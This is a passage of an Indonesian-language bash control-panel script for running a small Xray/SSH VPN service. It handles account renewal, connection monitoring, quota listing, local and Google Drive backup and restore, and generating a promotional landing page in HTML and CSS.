    if [[ "$protocol" != "ssh" ]]; then



        local uname="${fname#*-}"



        local tmp; tmp=$(mktemp)



        jq --arg email "$uname" --arg exp "$new_exp" \
           '(.inbounds[].settings.clients[]? | select(.email == $email)) += {"email": $email}' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null && mv "$tmp" "$XRAY_CONFIG" || rm -f "$tmp"



    fi







    echo ""



    echo -e "  ${GREEN}✔ Akun ${fname} diperpanjang ${add_days} hari${NC}"



    echo -e "  ${WHITE}Expired baru: ${CYAN}${new_exp}${NC}"



    sleep 2



}







#================================================



# LIVE CONNECTIONS MONITOR



#================================================







menu_live_connections() {



    clear



    local W; W=$(get_width)



    print_menu_header "LIVE CONNECTIONS"



    echo -e "  ${WHITE}Waktu :${NC} ${CYAN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"



    echo ""







    # ── Xray connections ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}XRAY CONNECTIONS${NC}"



    _box_divider $W



    local xray_conns



    xray_conns=$(ss -tnp 2>/dev/null | grep xray | grep ESTAB | awk '{print $5}' | sort | uniq -c | sort -rn)



    if [[ -n "$xray_conns" ]]; then



        echo "$xray_conns" | while read -r count ip; do



            printf "  ${GREEN}%3s conn${NC}  %s\n" "$count" "$ip"



        done



    else



        echo -e "  ${DIM}Tidak ada koneksi Xray aktif${NC}"



    fi



    _box_bottom $W



    echo ""







    # ── SSH connections ──



    _box_top $W



    _box_center $W "${CYAN}${BOLD}SSH CONNECTIONS${NC}"



    _box_divider $W



    local ssh_conns



    ssh_conns=$(who 2>/dev/null | grep -v "^$")



    if [[ -n "$ssh_conns" ]]; then



        while IFS= read -r line; do



            echo -e "  ${GREEN}●${NC} $line"



        done <<< "$ssh_conns"



    else



        echo -e "  ${DIM}Tidak ada sesi SSH aktif${NC}"



    fi



    _box_bottom $W



    echo ""







    # ── Summary ──



    local total_tcp; total_tcp=$(ss -tnp 2>/dev/null | grep -c ESTAB)



    echo -e "  ${WHITE}Total koneksi aktif :${NC} ${GREEN}${total_tcp}${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# INFO QUOTA AKUN



#================================================







menu_quota() {



    clear



    local W; W=$(get_width)



    print_menu_header "INFO QUOTA AKUN"



    if [[ ! -d "$AKUN_DIR" ]] || [[ -z "$(ls $AKUN_DIR/*.txt 2>/dev/null)" ]]; then



        echo -e "  ${YELLOW}Tidak ada akun tersimpan.${NC}"; sleep 2; return



    fi







    _box_top $W



    _box_center $W "${CYAN}${BOLD}DAFTAR AKUN & QUOTA${NC}"



    _box_divider $W



    printf "  ${WHITE}%-28s %-12s %-8s %s${NC}\n" "AKUN" "EXPIRED" "QUOTA" "IP LIMIT"



    _box_divider $W







    local now_ts; now_ts=$(date +%s)



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local fname; fname=$(basename "$f" .txt)



        local exp_str quota iplimit exp_ts status_color



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | cut -d= -f2-)



        quota=$(grep "QUOTA=" "$f" 2>/dev/null | cut -d= -f2-)



        iplimit=$(grep "IPLIMIT=" "$f" 2>/dev/null | cut -d= -f2-)



        exp_ts=$(parse_exp_ts "$exp_str")







        if [[ -n "$exp_ts" && "$exp_ts" -lt "$now_ts" ]]; then



            status_color="${RED}"



        else



            status_color="${GREEN}"



        fi







        printf "  ${status_color}%-28s${NC} %-12s %-8s %s\n" \
            "${fname:0:28}" \
            "${exp_str:0:12}" \
            "${quota:-unlim}" \
            "${iplimit:-1}"



    done



    _box_bottom $W



    echo ""



    read -rp "  Press any key to back..."



}







_menu_list_all() {



    clear; print_menu_header "ALL ACCOUNTS"



    local total=0



    shopt -s nullglob



    for proto in ssh vmess vless trojan; do



        local files=("$AKUN_DIR"/${proto}-*.txt)



        [[ ${#files[@]} -eq 0 ]] && continue



        echo -e "  ${GREEN}── ${proto^^} ACCOUNTS ─────────────────────────────────${NC}"



        for f in "${files[@]}"; do



            local uname exp



            uname=$(basename "$f" .txt | sed "s/${proto}-//")



            exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



            printf "  ${CYAN}▸${NC} ${GREEN}%-20s${NC} ${YELLOW}%s${NC}\n" "$uname" "$exp"



            ((total++))



        done



        echo ""



    done



    shopt -u nullglob



    echo -e "  ${WHITE}Total: ${GREEN}${total}${NC} accounts"



    echo ""; read -rp "  Press any key to back..."



}








_restore_backup() {
    clear; print_menu_header "RESTORE BACKUP"

    local backup_dir="/root/backups"

    echo -e "  ${YELLOW}Available backups:${NC}\n"

    # List local backups
    local local_backups=()
    if [[ -d "$backup_dir" ]]; then
        mapfile -t local_backups < <(ls -1t "$backup_dir"/vpn-fullbackup-*.tar.gz 2>/dev/null)
    fi

    if [[ ${#local_backups[@]} -eq 0 ]]; then
        echo -e "  ${YELLOW}No local backups found.${NC}"
    else
        local i=1
        for bf in "${local_backups[@]:0:10}"; do
            local bn=$(basename "$bf")
            local sz=$(du -h "$bf" | awk '{print $1}')
            echo -e "  ${WHITE}[${i}]${NC} ${bn} (${sz})"
            ((i++))
        done
    fi

    # Check GDrive
    if command -v rclone &>/dev/null && rclone listremotes 2>/dev/null | grep -q "gdrive:"; then
        echo -e "\n  ${CYAN}Google Drive backups:${NC}"
        rclone ls "gdrive:/vpn-backups/" 2>/dev/null | head -10 | while read -r sz fn; do
            echo -e "  ${YELLOW}GDrive:${NC} ${fn} ($(numfmt --to=iec $sz 2>/dev/null || echo ${sz}))"
        done
        echo -e "\n  ${WHITE}[D]${NC} Download latest from Google Drive"
    fi

    echo -e "\n  ${WHITE}[0]${NC} Back"
    echo ""
    read -rp "  Pilih backup untuk restore (atau 0): " rb_choice

    local selected=""
    if [[ "$rb_choice" == "0" ]]; then
        return
    elif [[ "$rb_choice" == "D" || "$rb_choice" == "d" ]]; then
        # Download from GDrive
        if ! command -v rclone &>/dev/null; then
            echo -e "  ${RED}rclone tidak terinstall!${NC}"; sleep 2; return
        fi
        echo -e "  ${YELLOW}Downloading latest backup from Google Drive...${NC}"
        mkdir -p "$backup_dir"
        local latest_gd=$(rclone lsf "gdrive:/vpn-backups/" --include "vpn-fullbackup-*.tar.gz" --format "p" 2>/dev/null | sort -r | head -1)
        if [[ -n "$latest_gd" ]]; then
            rclone copyto "gdrive:/vpn-backups/$latest_gd" "$backup_dir/$latest_gd" 2>/dev/null
            selected="$backup_dir/$latest_gd"
        fi
    elif [[ "$rb_choice" =~ ^[0-9]+$ ]] && [[ ${local_backups[$((rb_choice-1))]+_} ]]; then
        selected="${local_backups[$((rb_choice-1))]}"
    fi

    if [[ -z "$selected" || ! -f "$selected" ]]; then
        echo -e "  ${RED}Backup tidak ditemukan!${NC}"; sleep 2; return
    fi

    echo -e "\n  ${YELLOW}Restoring from: $(basename "$selected")${NC}"
    echo -e "  ${RED}PERINGATAN: Ini akan menimpa database & config saat ini!${NC}"
    read -rp "  Lanjutkan? [y/N]: " rb_confirm
    if [[ "$rb_confirm" != "y" && "$rb_confirm" != "Y" ]]; then
        echo -e "  ${YELLOW}Restore dibatalkan.${NC}"; sleep 2; return
    fi

    local tmp_restore="/tmp/vpn-restore-$$"
    mkdir -p "$tmp_restore"
    tar -xzf "$selected" -C "$tmp_restore" 2>/dev/null

    # Restore MySQL
    if [[ -f "$tmp_restore/ordervpn.sql" ]]; then
        echo -e "  ${CYAN}→${NC} Restoring MySQL database..."
        if ! command -v mysql &>/dev/null; then
            echo -e "  ${RED}✘${NC} mysql CLI not found! Install mysql-client dulu."
        else
            local RMYSQL_CMD="mysql"
            [[ -f /etc/mysql/debian.cnf ]] && RMYSQL_CMD="mysql --defaults-file=/etc/mysql/debian.cnf"
            $RMYSQL_CMD ordervpn < "$tmp_restore/ordervpn.sql" 2>/dev/null && \
                echo -e "  ${GREEN}✔${NC} Database restored!" || \
                echo -e "  ${RED}✘${NC} Database restore failed!"
        fi
    fi

    # Restore config files
    echo -e "  ${CYAN}→${NC} Restoring config files..."
    for f in domain .domain_type akun .bot_token .chat_id .payment_info xray.crt xray.key config.json; do
        if [[ -f "$tmp_restore/$f" ]]; then
            case "$f" in
                domain|.domain_type|akun|.bot_token|.chat_id|.payment_info)
                    cp "$tmp_restore/$f" "/root/$f" 2>/dev/null ;;
                xray.crt|xray.key)
                    cp "$tmp_restore/$f" "/etc/xray/$f" 2>/dev/null ;;
                config.json)
                    cp "$tmp_restore/$f" "/usr/local/etc/xray/config.json" 2>/dev/null ;;
            esac
        fi
    done
    echo -e "  ${GREEN}✔${NC} Config files restored!"

    # Restart services
    echo -e "  ${CYAN}→${NC} Restarting services..."
    systemctl restart xray 2>/dev/null || true
    systemctl restart nginx 2>/dev/null || true
    echo -e "  ${GREEN}✔${NC} Services restarted!"

    rm -rf "$tmp_restore"
    echo -e "\n  ${GREEN}╔════════════════════════════════╗${NC}"
    echo -e "  ${GREEN}║   RESTORE BERHASIL!          ║${NC}"
    echo -e "  ${GREEN}╚════════════════════════════════╝${NC}"
    echo -e "  ${YELLOW}Semua data & config telah dikembalikan.${NC}"
    echo ""; read -rp "  Press any key to back..."
}

_menu_backup() {



    clear; print_menu_header "BACKUP SYSTEM"



    echo -e "  ${YELLOW}Creating backup...${NC}"



    local backup_dir="/root/backups"



    local backup_file="vpn-backup-$(date +%Y%m%d-%H%M%S).tar.gz"



    mkdir -p "$backup_dir"



    tar -czf "$backup_dir/$backup_file" \
        /root/domain /root/.domain_type /root/akun \
        /root/.bot_token /root/.chat_id /root/.payment_info \
        /etc/xray/xray.crt /etc/xray/xray.key \
        /usr/local/etc/xray/config.json 2>/dev/null



    if [[ -f "$backup_dir/$backup_file" ]]; then



        echo -e "  ${GREEN}✔ Backup created!${NC}"



        echo -e "  File : ${WHITE}$backup_file${NC}"



        echo -e "  Size : ${CYAN}$(du -h "$backup_dir/$backup_file" | awk '{print $1}')${NC}"



    else



        echo -e "  ${RED}✘ Backup failed!${NC}"



    fi



    echo ""; read -rp "  Press any key to back..."



}







_menu_restore() {



    clear; print_menu_header "RESTORE SYSTEM"



    local backup_dir="/root/backups"



    [[ ! -d "$backup_dir" ]] && { echo -e "  ${RED}No backup directory!${NC}"; sleep 2; return; }



    shopt -s nullglob



    local backups=("$backup_dir"/*.tar.gz)



    shopt -u nullglob



    # Sort by newest first



    IFS=$'\n' backups=($(ls -t "${backups[@]}" 2>/dev/null)); unset IFS



    [[ ${#backups[@]} -eq 0 ]] && { echo -e "  ${RED}No backups found!${NC}"; sleep 2; return; }



    local i=1



    for backup in "${backups[@]}"; do



        printf "  ${CYAN}[%d]${NC} %-40s ${YELLOW}%s${NC}\n" "$i" "$(basename "$backup")" "$(du -h "$backup" | awk '{print $1}')"



        ((i++))



    done



    echo ""; read -rp "  Select [1-${#backups[@]}] or 0 to cancel: " choice



    # Fix: kondisi ambigu - pakai if eksplisit



    if [[ "$choice" == "0" ]] || [[ ! "$choice" =~ ^[0-9]+$ ]]; then



        echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return



    fi



    local selected="${backups[$((choice-1))]}"



    [[ -z "$selected" ]] && { echo -e "  ${RED}Pilihan tidak valid!${NC}"; sleep 1; return; }



    read -rp "  Continue? [y/N]: " confirm



    [[ "$confirm" != "y" ]] && { echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return; }



    tar -xzf "$selected" -C / 2>/dev/null && \
        echo -e "  ${GREEN}✔ Restore successful!${NC}" || \
        echo -e "  ${RED}✘ Restore failed!${NC}"



    systemctl restart xray nginx haproxy 2>/dev/null



    echo ""; read -rp "  Tekan Enter untuk kembali..."



}







_show_help() {



    clear; print_menu_header "COMMAND GUIDE"



    echo -e "  ${CYAN}[1-4]${NC}  → Kelola akun SSH/VMess/VLess/Trojan"



    echo -e "  ${CYAN}[5]${NC}    → Generate trial Xray (1 jam)"



    echo -e "  ${CYAN}[6]${NC}    → List semua akun"



    echo -e "  ${CYAN}[7-8]${NC}  → Cek / hapus akun expired"



    echo -e "  ${CYAN}[9]${NC}    → Telegram bot management (VPN-Bot)"



    echo -e "  ${CYAN}[10]${NC}   → Ganti domain"



    echo -e "  ${CYAN}[11]${NC}   → Fix/renew SSL certificate"



    echo -e "  ${CYAN}[12]${NC}   → Optimize VPS settings"



    echo -e "  ${CYAN}[13]${NC}   → Restart semua service"



    echo -e "  ${CYAN}[14]${NC}   → Lihat info port"



    echo -e "  ${CYAN}[15]${NC}   → Speedtest Ookla"



    echo -e "  ${CYAN}[16]${NC}   → Update script dari GitHub"



    echo -e "  ${CYAN}[17-18]${NC}→ Backup & restore"



    echo -e "  ${CYAN}[19]${NC}   → Menu uninstall"



    echo -e "  ${CYAN}[20]${NC}   → Advanced settings"



    echo -e "  ${CYAN}[0]${NC}    → Exit"



    echo ""; read -rp "  Press any key to back..."



}







#================================================



# AUTO INSTALL



#================================================







#================================================



# DEPLOY WEB PAGE (dipanggil saat install & update)



#================================================







deploy_web_page() {



    mkdir -p "$PUBLIC_HTML"



    rm -f "$PUBLIC_HTML/index.nginx-debian.html" "$PUBLIC_HTML/50x.html" "$PUBLIC_HTML/index.htm"



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    [[ -z "$DOMAIN" ]] && DOMAIN=$(curl -4 -s ifconfig.me 2>/dev/null || wget -qO- ipv4.icanhazip.com 2>/dev/null)



    PAGE_TITLE="Youzin Crabz Tunnel"



    PAGE_DESC="Layanan VPN Premium dengan teknologi Xray-core, WebSocket, dan gRPC. Nikmati koneksi cepat, stabil, dan aman."



    SITE_URL="${DOMAIN}"



    PROTO="http"



    [[ -d "/etc/letsencrypt/live/$DOMAIN" ]] && PROTO="https"



    if [[ -n "$DOMAIN" && "$DOMAIN" != "(belum diset)" ]]; then



        SITE_URL="${PROTO}://${DOMAIN}"



    else



        SITE_URL="${PROTO}://${DOMAIN}"



    fi







    cat > "$PUBLIC_HTML/robots.txt" << 'ROBOTEOF'



User-agent: *



Allow: /



Disallow: /akun/



Disallow: /admin/



Disallow: /api/



Sitemap: SITEMAP_PLACEHOLDER



ROBOTEOF



    if [[ -n "$DOMAIN" ]]; then



        sed -i "s|SITEMAP_PLACEHOLDER|${SITE_URL}/sitemap.xml|g" "$PUBLIC_HTML/robots.txt"



    else



        sed -i "s|SITEMAP_PLACEHOLDER|/sitemap.xml|g" "$PUBLIC_HTML/robots.txt"



    fi







    cat > "$PUBLIC_HTML/sitemap.xml" << 'SITEMAPEOF'



<?xml version="1.0" encoding="UTF-8"?>



<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">



  <url>



    <loc>SITEMAP_PLACEHOLDER</loc>



    <changefreq>daily</changefreq>



    <priority>1.0</priority>



  </url>



</urlset>



SITEMAPEOF



    if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



        sed -i "s|SITEMAP_PLACEHOLDER|https://${DOMAIN}|g" "$PUBLIC_HTML/sitemap.xml"



    else



        sed -i "s|SITEMAP_PLACEHOLDER|http://${DOMAIN}|g" "$PUBLIC_HTML/sitemap.xml"



    fi







    cat > "$PUBLIC_HTML/index.html" << 'WEBEOF'



<!DOCTYPE html>



<html lang="id">



<head>



<meta charset="UTF-8">



<meta name="viewport" content="width=device-width, initial-scale=1.0">



<title>PAGE_TITLE | VPN Premium</title>



<meta name="description" content="PAGE_DESC">



<meta name="keywords" content="VPN, Xray, VMess, VLess, Trojan, WebSocket, gRPC, proxy, tunnel, SSH">



<meta name="robots" content="index, follow">



<meta name="author" content="Youzin Crabz Tunel">



<meta name="theme-color" content="#0a0a1a">



<link rel="canonical" href="SITE_URL">



<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">



<!-- Open Graph -->



<meta property="og:type" content="website">



<meta property="og:url" content="SITE_URL">



<meta property="og:title" content="PAGE_TITLE | VPN Premium">



<meta property="og:description" content="PAGE_DESC">



<meta property="og:image" content="SITE_URL/og-image.png">



<meta property="og:locale" content="id_ID">



<!-- Twitter Cards -->



<meta name="twitter:card" content="summary_large_image">



<meta name="twitter:title" content="PAGE_TITLE | VPN Premium">



<meta name="twitter:description" content="PAGE_DESC">



<!-- Google Search Console -->



<meta name="google-site-verification" content="GOOGLE_VERIFICATION">



<!-- Google Analytics -->



<script>



var gaId = 'GA_ID';



if (gaId) {



  var s = document.createElement('script');



  s.async = true;



  s.src = 'https://www.googletagmanager.com/gtag/js?id=' + gaId;



  document.head.appendChild(s);



  window.dataLayer = window.dataLayer || [];



  function gtag(){dataLayer.push(arguments);}



  gtag('js', new Date());



  gtag('config', gaId);



}



</script>



<!-- Schema.org Structured Data -->



<script type="application/ld+json">



{



  "@context": "https://schema.org",



  "@type": "Organization",



  "name": "Youzin Crabz Tunnel",



  "description": "PAGE_DESC",



  "url": "SITE_URL",



  "logo": "SITE_URL/logo.png",



  "contactPoint": {



    "@type": "ContactPoint",



    "telephone": "+62-xxx-xxxx-xxxx",



    "contactType": "customer service",



    "availableLanguage": ["Indonesia", "English"]



  },



  "sameAs": [



    "https://t.me/youzin_crabz"



  ]



}



</script>



<!-- FAQ Schema -->



<script type="application/ld+json">



{



  "@context": "https://schema.org",



  "@type": "FAQPage",



  "mainEntity": [



    {



      "@type": "Question",



      "name": "Apa itu Youzin Crabz Tunnel?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Layanan VPN premium berbasis Xray-core yang mendukung berbagai protokol seperti VMess, VLess, Trojan, dan SSH dengan koneksi WebSocket dan gRPC."



      }



    },



    {



      "@type": "Question",



      "name": "Bagaimana cara order VPN?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Hubungi admin melalui Telegram untuk melakukan pemesanan dan pembayaran. Setelah konfirmasi, akun akan dibuat dalam waktu singkat."



      }



    },



    {



      "@type": "Question",



      "name": "Apakah ada garansi?",



      "acceptedAnswer": {



        "@type": "Answer",



        "text": "Ya, kami menyediakan garansi server aktif 24/7 dengan monitoring otomatis. Jika ada masalah, tim support siap membantu."



      }



    }



  ]



}



</script>



<!-- Preconnect -->



<link rel="preconnect" href="https://fonts.googleapis.com">



<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>



<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">



<style>



:root {



  --bg: #08081a;



  --bg2: #0d0d25;



  --bg3: #12123a;



  --surface: rgba(255,255,255,0.04);



  --surface-hover: rgba(255,255,255,0.08);



  --border: rgba(255,255,255,0.08);



  --border-hover: rgba(255,255,255,0.15);



  --text: #e8e8f0;



  --text-dim: #8888aa;



  --text-bright: #ffffff;



  --primary: #00d4ff;



  --primary-dim: rgba(0,212,255,0.15);



  --secondary: #7c3aed;



  --secondary-dim: rgba(124,58,237,0.15);



  --accent: #10b981;



  --accent-dim: rgba(16,185,129,0.15);



  --gold: #f59e0b;



  --gold-dim: rgba(245,158,11,0.15);



  --radius: 16px;



  --radius-sm: 8px;



  --shadow: 0 4px 30px rgba(0,0,0,0.3);



}



* { margin: 0; padding: 0; box-sizing: border-box; }



html { scroll-behavior: smooth; }



body {



  font-family: 'Inter', -apple-system, sans-serif;



  background: var(--bg);



  color: var(--text);



  line-height: 1.6;



  overflow-x: hidden;



}



::selection { background: var(--primary); color: var(--bg); }







/* Ambient Background */



#bg-glow {



  position: fixed;



  inset: 0;



  z-index: 0;



  pointer-events: none;



  overflow: hidden;



}



.orb {



  position: absolute;



  border-radius: 50%;



  filter: blur(80px);



  opacity: 0.3;



  animation: orbFloat 20s ease-in-out infinite;



}



.orb-1 {



  width: 600px; height: 600px;



  background: radial-gradient(circle, var(--primary), transparent);



  top: -200px; right: -100px;



  animation-delay: 0s;



}



.orb-2 {



  width: 500px; height: 500px;



  background: radial-gradient(circle, var(--secondary), transparent);



  bottom: -150px; left: -150px;



  animation-delay: -7s;



}



.orb-3 {



  width: 400px; height: 400px;



  background: radial-gradient(circle, var(--accent), transparent);



  top: 50%; left: 50%;



  transform: translate(-50%, -50%);



  animation-delay: -14s;



}



@keyframes orbFloat {



  0%, 100% { transform: translate(0, 0) scale(1); }



  25% { transform: translate(50px, -50px) scale(1.1); }



  50% { transform: translate(-30px, 30px) scale(0.9); }



  75% { transform: translate(40px, 20px) scale(1.05); }



}







/* Grid pattern overlay */



#grid-overlay {



  position: fixed;



  inset: 0;



  z-index: 0;



  pointer-events: none;



  background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),



                    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);



  background-size: 60px 60px;



}







.container {



  position: relative;



  z-index: 1;



  max-width: 1200px;



  margin: 0 auto;



  padding: 0 24px;



}







/* Nav */



.nav {



  position: fixed;



  top: 0; left: 0; right: 0;



  z-index: 100;



  padding: 16px 0;



  backdrop-filter: blur(20px);



  -webkit-backdrop-filter: blur(20px);



  background: rgba(8,8,26,0.8);



  border-bottom: 1px solid var(--border);



  transition: all 0.3s;



}



.nav .container {



  display: flex;



  align-items: center;



  justify-content: space-between;



}



.nav-logo {



  display: flex;



  align-items: center;



  gap: 10px;



  font-size: 18px;



  font-weight: 700;



  color: var(--text-bright);



  text-decoration: none;



}



.nav-logo-icon {



  width: 36px;



  height: 36px;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  border-radius: 10px;



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 18px;



}



.nav-links {



  display: flex;



  align-items: center;



  gap: 8px;



  list-style: none;



}



.nav-links a {



  padding: 8px 16px;



  border-radius: var(--radius-sm);



  color: var(--text-dim);



  text-decoration: none;



  font-size: 14px;



  font-weight: 500;



  transition: all 0.2s;



}



.nav-links a:hover { color: var(--text); background: var(--surface); }



.nav-cta {



  padding: 8px 20px !important;



  background: linear-gradient(135deg, var(--primary), var(--secondary)) !important;



  color: var(--text-bright) !important;



  border-radius: var(--radius-sm) !important;



  font-weight: 600 !important;



}



.nav-cta:hover { opacity: 0.9; transform: translateY(-1px); }



.mobile-toggle {



  display: none;



  background: none;



  border: none;



  color: var(--text);



  font-size: 24px;



  cursor: pointer;



  padding: 8px;



}







/* Hero */



.hero {



  min-height: 100vh;



  display: flex;



  align-items: center;



  padding: 120px 0 80px;



  position: relative;



}



.hero-content {



  text-align: center;



  max-width: 800px;



  margin: 0 auto;



}



.hero-badge {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 8px 16px;



  background: var(--primary-dim);



  border: 1px solid rgba(0,212,255,0.2);



  border-radius: 100px;



  font-size: 13px;



  font-weight: 500;



  color: var(--primary);



  margin-bottom: 24px;



}



.hero-badge .dot {



  width: 8px; height: 8px;



  background: var(--accent);



  border-radius: 50%;



  animation: pulse 2s infinite;



}



@keyframes pulse {



  0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.5); }



  50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(16,185,129,0); }



}



.hero h1 {



  font-size: clamp(36px, 6vw, 64px);



  font-weight: 800;



  line-height: 1.1;



  margin-bottom: 20px;



  color: var(--text-bright);



}



.hero h1 span {



  background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));



  -webkit-background-clip: text;



  -webkit-text-fill-color: transparent;



  background-clip: text;



}



.hero p {



  font-size: 18px;



  color: var(--text-dim);



  max-width: 640px;



  margin: 0 auto 32px;



  line-height: 1.7;



}



.hero-cta {



  display: flex;



  gap: 12px;



  justify-content: center;



  flex-wrap: wrap;



}



.btn {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 14px 28px;



  border-radius: var(--radius-sm);



  font-size: 15px;



  font-weight: 600;



  text-decoration: none;



  cursor: pointer;



  transition: all 0.3s;



  border: none;



}



.btn-primary {



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  color: #fff;



  box-shadow: 0 4px 20px rgba(0,212,255,0.3);



}



.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,212,255,0.4); }



.btn-secondary {



  background: var(--surface);



  color: var(--text);



  border: 1px solid var(--border);



}



.btn-secondary:hover { background: var(--surface-hover); border-color: var(--border-hover); transform: translateY(-2px); }







.hero-stats {



  display: flex;



  gap: 40px;



  justify-content: center;



  margin-top: 48px;



  padding-top: 32px;



  border-top: 1px solid var(--border);



}



.hero-stat { text-align: center; }



.hero-stat-value {



  font-size: 28px;



  font-weight: 700;



  color: var(--text-bright);



  font-family: 'JetBrains Mono', monospace;



}



.hero-stat-label {



  font-size: 13px;



  color: var(--text-dim);



  margin-top: 4px;



}







/* Section */



.section {



  padding: 100px 0;



}



.section-label {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 6px 14px;



  background: var(--primary-dim);



  border-radius: 100px;



  font-size: 12px;



  font-weight: 600;



  color: var(--primary);



  text-transform: uppercase;



  letter-spacing: 1px;



  margin-bottom: 16px;



}



.section-title {



  font-size: clamp(28px, 4vw, 40px);



  font-weight: 700;



  color: var(--text-bright);



  margin-bottom: 16px;



}



.section-desc {



  font-size: 16px;



  color: var(--text-dim);



  max-width: 600px;



  line-height: 1.7;



  margin-bottom: 48px;



}



.section-center {



  text-align: center;



}



.section-center .section-desc {



  margin-left: auto;



  margin-right: auto;



}







/* Pricing */



pricing-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));



  gap: 24px;



  margin-top: 40px;



}



.pricing-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 32px;



  transition: all 0.3s;



  position: relative;



}



.pricing-card:hover {



  transform: translateY(-4px);



  border-color: var(--border-hover);



  box-shadow: var(--shadow);



}



.pricing-card.featured {



  border-color: var(--primary);



  background: linear-gradient(180deg, var(--primary-dim), var(--surface));



}



.pricing-card.featured .pricing-badge {



  position: absolute;



  top: -12px;



  left: 50%;



  transform: translateX(-50%);



  padding: 4px 16px;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  border-radius: 100px;



  font-size: 12px;



  font-weight: 600;



  color: #fff;



}



.pricing-name {



  font-size: 20px;



  font-weight: 700;



  color: var(--text-bright);



  margin-bottom: 8px;



}



.pricing-price {



  font-size: 36px;



  font-weight: 800;



  color: var(--text-bright);



  font-family: 'JetBrains Mono', monospace;



  margin-bottom: 4px;



}



.pricing-price span {



  font-size: 16px;



  font-weight: 400;



  color: var(--text-dim);



}



.pricing-desc {



  font-size: 14px;



  color: var(--text-dim);



  margin-bottom: 24px;



}



.pricing-features {



  list-style: none;



  margin-bottom: 28px;



}



.pricing-features li {



  padding: 8px 0;



  font-size: 14px;



  color: var(--text);



  display: flex;



  align-items: center;



  gap: 10px;



}



.pricing-features li::before {



  content: "✓";



  color: var(--accent);



  font-weight: 700;



}



.pricing-btn {



  width: 100%;



  text-align: center;



  justify-content: center;



}







/* Features */



.features-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));



  gap: 20px;



}



.feature-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 28px;



  transition: all 0.3s;



}



.feature-card:hover {



  background: var(--surface-hover);



  border-color: var(--border-hover);



  transform: translateY(-2px);



}



.feature-icon {



  width: 48px;



  height: 48px;



  background: var(--primary-dim);



  border-radius: 12px;



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 22px;



  margin-bottom: 16px;



}



.feature-card h3 {



  font-size: 16px;



  font-weight: 600;



  color: var(--text-bright);



  margin-bottom: 8px;



}



.feature-card p {



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.6;



}







/* Protocols */



.protocols-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));



  gap: 16px;



}



.protocol-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 24px;



  text-align: center;



  transition: all 0.3s;



}



.protocol-card:hover {



  border-color: var(--primary);



  background: var(--primary-dim);



  transform: translateY(-2px);



}



.protocol-icon {



  font-size: 32px;



  margin-bottom: 8px;



}



.protocol-card h3 {



  font-size: 14px;



  font-weight: 600;



  color: var(--text);



}







/* Testimonials */



testimonial-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));



  gap: 20px;



}



.testimonial-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 28px;



}



.testimonial-stars {



  color: var(--gold);



  margin-bottom: 12px;



  font-size: 14px;



}



.testimonial-text {



  font-size: 14px;



  color: var(--text);



  line-height: 1.7;



  margin-bottom: 16px;



  font-style: italic;



}



.testimonial-author {



  display: flex;



  align-items: center;



  gap: 12px;



}



.testimonial-avatar {



  width: 40px;



  height: 40px;



  border-radius: 50%;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 16px;



  font-weight: 700;



  color: #fff;



}



.testimonial-name {



  font-size: 14px;



  font-weight: 600;



  color: var(--text-bright);



}



.testimonial-role {



  font-size: 12px;



  color: var(--text-dim);



}







/* FAQ */



.faq-list {



  max-width: 720px;



  margin: 0 auto;



}



.faq-item {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius-sm);



  margin-bottom: 12px;



  overflow: hidden;



  cursor: pointer;



}



.faq-question {



  padding: 20px 24px;



  font-size: 15px;



  font-weight: 600;



  color: var(--text);



  display: flex;



  justify-content: space-between;



  align-items: center;



  transition: all 0.2s;



  user-select: none;



}



.faq-question:hover { color: var(--primary); }



.faq-question::after {



  content: "+";



  font-size: 20px;



  transition: transform 0.3s;



  color: var(--text-dim);



}



.faq-item.active .faq-question::after {



  transform: rotate(45deg);



